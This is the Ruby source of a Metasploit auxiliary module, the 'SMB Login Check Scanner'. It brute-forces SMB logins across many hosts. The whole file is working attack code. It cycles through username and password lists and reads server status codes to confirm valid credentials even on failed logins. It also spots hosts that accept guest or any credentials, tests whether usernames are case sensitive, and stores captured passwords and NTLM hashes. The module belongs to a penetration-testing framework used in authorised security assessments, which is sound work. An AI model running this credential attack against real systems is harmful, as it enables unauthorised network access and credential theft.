##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB
  include Msf::Exploit::Remote::SMB::Authenticated

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  attr_reader :accepts_bogus_domains

  def proto
    'smb'
  end
  def initialize
    super(
      'Name'           => 'SMB Login Check Scanner',
      'Description'    => %q{
        This module will test a SMB login on a range of machines and
        report successful logins.  If you have loaded a database plugin
        and connected to a database this module will record successful
        logins and hosts so you can track your access.
      },
      'Author'         =>
        [
          'tebo <tebo [at] attackresearch [dot] com>', # Original
          'Ben Campbell <eat_meatballs [at] hotmail.co.uk>' # Refactoring
        ],
      'References'     =>
        [
          [ 'CVE', '1999-0506'], # Weak password
        ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'DB_ALL_CREDS'    => false,
          'BLANK_PASSWORDS' => false,
          'USER_AS_PASS'    => false
        }
    )
    deregister_options('RHOST','USERNAME','PASSWORD')

    @accepts_guest_logins = {}

    @correct_credentials_status_codes = [
      "STATUS_INVALID_LOGON_HOURS",
      "STATUS_INVALID_WORKSTATION",
      "STATUS_ACCOUNT_RESTRICTION",
      "STATUS_ACCOUNT_EXPIRED",
      "STATUS_ACCOUNT_DISABLED",
      "STATUS_ACCOUNT_RESTRICTION",
      "STATUS_PASSWORD_EXPIRED",
      "STATUS_PASSWORD_MUST_CHANGE",
      "STATUS_LOGON_TYPE_NOT_GRANTED"
    ]

    # These are normally advanced options, but for this module they have a
    # more active role, so make them regular options.
    register_options(
      [
        OptString.new('SMBPass', [ false, "SMB Password" ]),
        OptString.new('SMBUser', [ false, "SMB Username" ]),
        OptString.new('SMBDomain', [ false, "SMB Domain", '']),
        OptBool.new('PRESERVE_DOMAINS', [ false, "Respect a username that contains a domain name.", true]),
        OptBool.new('RECORD_GUEST', [ false, "Record guest-privileged random logins to the database", false])
      ], self.class)

  end

  def run_host(ip)
    print_brute(:level => :vstatus, :ip => ip, :msg => "Starting SMB login bruteforce")

    domain = datastore['SMBDomain'] || ""

    if accepts_bogus_logins?(domain)
      print_error("#{smbhost} - This system accepts authentication with any credentials, brute force is ineffective.")
      return
    end

    unless datastore['RECORD_GUEST']
      if accepts_guest_logins?(domain)
        print_status("#{ip} - This system allows guest sessions with any credentials, these instances will not be recorded.")
      end
    end

    begin
      each_user_pass do |user, pass|
        result = try_user_pass(domain, user, pass)
      end
    rescue ::Rex::ConnectionError
      nil
    end

  end

  def check_login_status(domain, user, pass)
    connect()
    status_code = ""
    begin
      simple.login(
        datastore['SMBName'],
        user,
        pass,
        domain,
        datastore['SMB::VerifySignature'],
        datastore['NTLM::UseNTLMv2'],
        datastore['NTLM::UseNTLM2_session'],
        datastore['NTLM::SendLM'],
        datastore['NTLM::UseLMKey'],
        datastore['NTLM::SendNTLM'],
        datastore['SMB::Native_OS'],
        datastore['SMB::Native_LM'],
        {:use_spn => datastore['NTLM::SendSPN'], :name =>  self.rhost}
      )

      # Windows SMB will return an error code during Session Setup, but nix Samba requires a Tree Connect:
      simple.connect("\\\\#{datastore['RHOST']}\\IPC$")
      status_code = 'STATUS_SUCCESS'
    rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
      status_code = e.get_error(e.error_code)
    rescue ::Rex::Proto::SMB::Exceptions::LoginError => e
      status_code = e.error_reason
    ensure
      disconnect()
    end

    return status_code
  end

  # If login is succesful and auth_user is unset
  # the login was as a guest user.
  def accepts_guest_logins?(domain)
    guest = false
    user = Rex::Text.rand_text_alpha(8)
    pass = Rex::Text.rand_text_alpha(8)

    guest_login = ((check_login_status(domain, user, pass) == 'STATUS_SUCCESS') && simple.client.auth_user.nil?)

    if guest_login
      @accepts_guest_logins['rhost'] ||=[] unless @accepts_guest_logins.include?(rhost)
      report_note(
        :host	=> rhost,
        :proto => 'tcp',
        :sname	=> 'smb',
        :port   =>  datastore['RPORT'],
        :type   => 'smb.account.info',
        :data   => 'accepts guest login from any account',
        :update => :unique_data
      )
    end

    return guest_login
  end

  # If login is successul and auth_user is set
  # then bogus creds are accepted.
  def accepts_bogus_logins?(domain)
    user = Rex::Text.rand_text_alpha(8)
    pass = Rex::Text.rand_text_alpha(8)
    bogus_login = ((check_login_status(domain, user, pass) == 'STATUS_SUCCESS') && !simple.client.auth_user.nil?)
    return bogus_login
  end

  # This logic is not universal ie a local account will not care about workgroup
  # but remote domain authentication will so check each instance
  def accepts_bogus_domains?(user, pass, rhost)
    domain  = Rex::Text.rand_text_alpha(8)
    status = check_login_status(domain, user, pass)

    bogus_domain = valid_credentials?(status)
    if bogus_domain
      vprint_status "Domain is ignored"
    end

    return valid_credentials?(status)
  end

  def valid_credentials?(status)
    return (status == "STATUS_SUCCESS" || @correct_credentials_status_codes.include?(status))
  end

  def try_user_pass(domain, user, pass)
    # Note that unless PRESERVE_DOMAINS is true, we're more
    # than happy to pass illegal usernames that contain
    # slashes.
    if datastore["PRESERVE_DOMAINS"]
      d,u = domain_username_split(user)
      user = u
      domain = d if d
    end

    user = user.to_s.gsub(/<BLANK>/i,"")
    status = check_login_status(domain, user, pass)

    # Match original output message
    if domain.empty? || domain == "."
      domain_part = ""
    else
      domain_part = " \\\\#{domain}"
    end
    output_message = "#{rhost}:#{rport}#{domain_part} - ".gsub('%', '%%')
    output_message << "%s"
    output_message << " (#{smb_peer_os}) #{user} : #{pass} [#{status}]".gsub('%', '%%')

    case status
    when 'STATUS_SUCCESS'
      # Auth user indicates if the login was as a guest or not
      if(simple.client.auth_user)
        print_good(output_message % "SUCCESSFUL LOGIN")
        validuser_case_sensitive?(domain, user, pass)
        report_creds(domain,user,pass,true)
      else
        if datastore['RECORD_GUEST']
          print_status(output_message % "GUEST LOGIN")
          report_creds(domain,user,pass,true)
        elsif datastore['VERBOSE']
          print_status(output_message % "GUEST LOGIN")
        end
      end

      return :next_user

    when *@correct_credentials_status_codes
      print_status(output_message % "FAILED LOGIN, VALID CREDENTIALS" )
      report_creds(domain,user,pass,false)
      validuser_case_sensitive?(domain, user, pass)
      return :skip_user

    when 'STATUS_LOGON_FAILURE', 'STATUS_ACCESS_DENIED'
      vprint_error(output_message % "FAILED LOGIN")
    else
      vprint_error(output_message % "FAILED LOGIN")
    end
  end

  def validuser_case_sensitive?(domain, user, pass)
    if user == user.downcase
      user = user.upcase
    else
      user = user.downcase
    end

    status = check_login_status(domain, user, pass)
    case_insensitive = valid_credentials?(status)
    if case_insensitive
      vprint_status("Username is case insensitive")
    end

    return case_insensitive
  end

  def note_creds(domain,user,pass,reason)
    report_note(
      :host	=> rhost,
      :proto => 'tcp',
      :sname	=> 'smb',
      :port   =>  datastore['RPORT'],
      :type   => 'smb.account.info',
      :data 	=> {:user => user, :pass => pass, :status => reason},
      :update => :unique_data
    )
  end

  def report_creds(domain,user,pass,active)
    login_name = ""

    if accepts_bogus_domains?(user,pass,rhost)
      login_name = user
    else
      login_name = "#{domain}\\#{user}"
    end

    report_hash = {
      :host	=> rhost,
      :port   => datastore['RPORT'],
      :sname	=> 'smb',
      :user 	=> login_name,
      :pass   => pass,
      :source_type => "user_supplied",
      :active => active
    }

    if pass =~ /[0-9a-fA-F]{32}:[0-9a-fA-F]{32}/
      report_hash.merge!({:type => 'smb_hash'})
    else
      report_hash.merge!({:type => 'password'})
    end
    report_auth_info(report_hash)
  end
end
